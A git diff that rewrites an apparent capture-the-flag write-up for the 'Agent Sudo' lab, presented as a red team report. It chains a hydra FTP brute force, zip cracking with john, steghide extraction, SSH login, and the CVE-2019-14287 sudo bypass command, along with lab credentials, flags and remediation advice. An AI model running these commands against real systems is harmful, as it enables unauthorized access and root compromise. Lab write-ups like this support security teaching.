@@ -1,85 +1,168 @@
-# Red Team Engagement Report: Agent Sudo (Detailed Analysis)
+# 🛡️ Red Team Engagement Report: Agent Sudo (Detailed Analysis)
+
+## 1. Executive Summary
+
+This report details a successful red team operation conducted on **July 19, 2025**, resulting in the complete compromise of the host at **10.10.11.80**. The engagement demonstrates how a combination of seemingly minor security flaws—information disclosure, weak credentials, and a vulnerable configuration—can be chained together to achieve full administrative access.
+
+The attack path began with web application enumeration, which revealed a valid system username (`chris`). This information was leveraged to perform a targeted brute-force attack against the exposed FTP service, successfully guessing a weak password. This initial access allowed for the exfiltration of files containing hidden credentials for a second user, which were extracted using steganography. Finally, privilege escalation to root was achieved by exploiting **CVE-2019-14287**, a known vulnerability in a misconfigured sudo policy that was intended to prevent root access.
+
+> 💡 This operation highlights that even simple information leaks can provide the critical first step an attacker needs to unravel an organization's security posture.
 
 ---
 
-### **1. Executive Summary**
-
-This report provides a detailed analysis of a successful red team operation conducted on **July 19, 2025**, which resulted in the complete compromise of the host at **10.10.11.80**. The engagement demonstrated how a chain of seemingly minor security oversights can be linked by an adversary to bypass security controls and achieve full administrative access.
-
-The attack path began by exploiting an exposed **FTP service** with weak credentials. This initial foothold allowed for the exfiltration of files containing hidden data (**steganography**). Analysis of this data revealed SSH credentials for a standard user, establishing a persistent foothold on the system. The final escalation to `root` was achieved by exploiting **CVE-2019-14287**, a well-documented vulnerability in a misconfigured `sudo` policy designed to prevent this exact outcome.
-
-The success of this operation underscores that security is a holistic process; a failure in one area (e.g., password policy) can invalidate controls in another (e.g., user permissions).
-
----
-
-### **2. Technical Kill Chain Narrative**
+## 2. Technical Kill Chain Narrative
 
 The attack progressed through a logical sequence of reconnaissance, initial access, and privilege escalation.
 
-#### **2.1. Reconnaissance & Initial Enumeration** 🕵️
+### 2.1 Reconnaissance & Initial Enumeration 🕵️
 
-The objective of reconnaissance is to map the target's attack surface. The Nmap scan identified three key services, each with distinct potential for exploitation:
+**Objective:** Map the target's attack surface and identify potential entry points.
 
-* **21/tcp (FTP):** This is a high-value target for reconnaissance. FTP services are notorious for misconfigurations, including anonymous access or, as in this case, accounts with weak, easily guessable passwords. The identified `vsftpd 3.0.3` version is not immediately vulnerable to a direct remote code execution exploit, shifting the focus to credential-based attacks.
-* **80/tcp (HTTP):** A web server is a primary vector for exploitation. The message requiring a custom `User-Agent` string is a form of weak access control. It signals that the application has a non-standard entry point and may contain hidden functionality, making it a point of interest.
-* **22/tcp (SSH):** As the standard for secure remote administration, gaining access to SSH is a primary goal. While the service itself is secure, it is the gateway for any credentials discovered elsewhere.
+#### Port Scanning
 
-**Logical Conclusion:** The most promising initial entry point was the FTP service due to the high probability of weak credentials.
+An Nmap scan of `10.10.11.80` identified three primary services:
 
----
+- **21/tcp (FTP):** vsftpd 3.0.3  
+- **22/tcp (SSH):** OpenSSH 7.6p1  
+- **80/tcp (HTTP):** Apache httpd 2.4.29  
 
-#### **2.2. Initial Access & Foothold** 🔑
+#### Web Enumeration
 
-The goal of this phase is to turn public information into a shell on the target system.
+The web server on port 80 presented a message requiring a custom User-Agent. By setting the agent to `"C"`:
 
-1.  **FTP Exploitation:** The credentials `chris:crystal` were attempted. This is a common brute-force pattern (using the username as the password) that frequently succeeds on non-critical or legacy services. The successful login immediately provided an initial foothold.
+```bash
+curl -A "C" http://10.10.11.80/
+```
 
-2.  **Data Exfiltration and Analysis:** Once inside the FTP server, all accessible files (`cute-alien.jpg`, `cutie.png`, `To_agentJ.txt`) were downloaded. Standard procedure dictates that any user-provided data could contain clues. `binwalk` was used on the image files because it is the standard tool for identifying embedded files or data streams (steganography). `binwalk`'s discovery of an encrypted ZIP archive inside `cutie.png` was a critical finding.
+A redirect was discovered to a hidden page: `agent_C_attention.php`, which leaked:
 
-3.  **Credential Discovery Chain:** The attack followed a logical chain of clues:
-    * **Crack ZIP:** The password for the ZIP archive was cracked using `john` with the `rockyou.txt` wordlist. The revealed password, `alien`, was weak and thematically related to the filenames. This is a common pattern in less secure environments.
-    * **Reveal Next Clue:** The contents of the ZIP file (`To_agentR.txt`) provided the Base64 string `QXJlYTUx`. Decoding this revealed `Area51`.
-    * **Uncover Final Secret:** It is logical to assume this new piece of information is a key for another locked item. `steghide` is the standard tool for steganography requiring a passphrase. Using `Area51` as the passphrase on the other downloaded file, `cute-alien.jpg`, successfully extracted the hidden message.
+> "Attention chris, ... change your god damn password, is weak!"
 
-4.  **Achieving a Low-Privilege Shell:** The extracted message contained SSH credentials: `james:hackerrules!`. This login was successful on the SSH service (port 22), elevating access from a simple FTP session to an interactive shell as the user `james`. This constitutes a successful system foothold.
-
----
-
-#### **2.3. Privilege Escalation** 🚀
-
-With a user shell, the objective shifted to gaining root access. The first step is always to enumerate the current user's privileges.
-
-1.  **Enumerating `sudo` Privileges:** The command `sudo -l` is standard practice for any user on a Linux system. It revealed the following rule:
-    ```bash
-    User james may run the following commands on agent-sudo:
-        (ALL, !root) /bin/bash
-    ```
-2.  **Identifying the Flaw:** This rule represents a flawed **deny-list** security model. The administrator's *intent* was to allow `james` to run `bash` as any user *except* for `root`. However, this type of rule is notoriously easy to bypass. The presence of `(ALL, !root)` immediately flags a potential vulnerability, specifically CVE-2019-14287.
-
-3.  **Exploiting CVE-2019-14287:** This vulnerability exists because `sudo` versions prior to 1.8.28 incorrectly handle user ID `-1` (or its unsigned equivalent, `4294967295`). When `sudo` is asked to run a command as user `-1`, its user-lookup functions can resolve this to UID `0` (root). The `!root` check in the sudoers policy fails to catch this, allowing the command to execute with root privileges.
-
-4.  **Executing the Exploit:** The command `sudo -u#-1 /bin/bash` leverages this flaw directly. The system granted a `bash` shell, and a subsequent `whoami` check would confirm the user is now `root`. This action successfully bypassed the intended security control and achieved the final objective of full system compromise.
+**Conclusion:** This enumeration phase yielded a valid username (`chris`) and a strong indication of a weak password. The FTP service became the logical target.
 
 ---
 
-### **3. Vulnerabilities and Actionable Recommendations**
+### 2.2 Initial Access & Foothold 🔑
 
-1.  **V-01: Insecure Service Configuration (Critical)**
-    * **Description:** The FTP service used weak, default-like credentials. Unencrypted protocols like FTP also transmit credentials in cleartext, posing a risk of interception.
-    * **Recommendation:**
-        * Disable the FTP service if it is not business-critical.
-        * If required, replace it with **SFTP (SSH File Transfer Protocol)**, which is encrypted by default.
-        * Enforce a **strong password policy** across all accounts and integrate user management with a central directory (e.g., LDAP, Active Directory) to ensure compliance.
+**Objective:** Convert gathered intelligence into a shell on the target system.
 
-2.  **V-02: Information Disclosure via Insecure Data Storage (High)**
-    * **Description:** Critical secrets (SSH credentials) were stored insecurely within publicly accessible files using trivial steganography.
-    * **Recommendation:**
-        * Implement a **secrets management** solution (e.g., HashiCorp Vault, AWS/GCP/Azure secret managers) for all credentials and API keys.
-        * Conduct **developer training** on secure coding practices, explicitly forbidding the storage of secrets in files.
-        * Integrate automated **secret scanning** tools into your CI/CD pipeline to detect exposed credentials before they reach production.
+#### Credential Brute-Force
 
-3.  **V-03: Sudo Privilege Escalation via Misconfiguration (Critical)**
-    * **Description:** The sudoers policy used a flawed deny-list approach, which was bypassed by the known vulnerability CVE-2019-14287.
-    * **Recommendation:**
-        * **Patch Immediately:** Update the `sudo` package to version `1.8.28` or later to remediate the CVE.
-        * **Adopt Allow-List Policies:** Never use `!` in sudoer rules. Instead, follow the **Principle of Least Privilege** by explicitly granting only the specific commands needed for a user to perform their role. For example: `james ALL = /usr/bin/specific_command`.
+```bash
+hydra -t 16 -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.80
+```
+
+Successfully cracked FTP password: `crystal`.
+
+#### Data Exfiltration and Steganography
+
+Files downloaded from FTP:
+
+- `cutie.png`
+- `cute-alien.jpg`
+- `To_agentJ.txt`
+
+##### Step A - Find Archive
+
+```bash
+binwalk -e cutie.png
+```
+
+Revealed a password-protected ZIP archive.
+
+##### Step B - Crack Archive
+
+```bash
+zip2john secret.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Password: `alien`
+
+##### Step C - Find Passphrase
+
+Decrypted `To_agentR.txt` containing Base64 string: `QXJlYTUx` → Decodes to: `Area51`
+
+##### Step D - Extract Credentials
+
+```bash
+steghide extract -sf cute-alien.jpg -p Area51
+```
+
+Message revealed SSH creds: `james:hackerrules!`
+
+#### Establish Shell
+
+```bash
+ssh james@10.10.11.80
+```
+
+Initial shell acquired as user `james`.
+
+---
+
+### 2.3 Privilege Escalation 🚀
+
+**Objective:** Escalate privileges to root.
+
+#### Check sudo Privileges
+
+```bash
+sudo -l
+```
+
+Output:
+
+```
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+
+#### Exploit CVE-2019-14287
+
+```bash
+sudo -u#-1 /bin/bash
+```
+
+UID `-1` maps to `0` (root) on vulnerable sudo versions, bypassing the `!root` restriction.
+
+#### Access Achieved
+
+Root flag read from `/root/root.txt`. Privilege escalation successful.
+
+---
+
+## 3. Vulnerabilities and Actionable Recommendations
+
+### V-01: Information Disclosure on Web Server (High)
+
+- **Description:** Web application leaked a system username.
+- **Recommendation:** Remove debugging info; protect sensitive endpoints with auth.
+
+### V-02: Weak Credentials on Exposed Service (Critical)
+
+- **Description:** FTP user `chris` used weak password `crystal`.
+- **Recommendation:** Enforce strong password policy. Disable FTP in favor of SFTP.
+
+### V-03: Insecure Data Storage via Steganography (High)
+
+- **Description:** SSH creds hidden in images.
+- **Recommendation:** Use centralized secret storage (e.g., Vault). Never store creds in files.
+
+### V-04: Sudo Privilege Escalation via Misconfiguration (Critical)
+
+- **Description:** Misuse of `!root` in sudoers allowed root via CVE-2019-14287.
+- **Recommendation:** 
+  - Patch sudo to >= `1.8.28`  
+  - Avoid deny-lists. Use strict allow-lists following least privilege.
+
+---
+
+**Flags Captured:**  
+- `user.txt`: `b03d975e8c92a7c04146cfa7a5a313c7`  
+- `root.txt`: `b53a02f55b57d4439e3341834d70c062`  
+
+---
+
+*Report prepared by: **666** | Red Team Operator*  
+*Engagement complete: ✅*
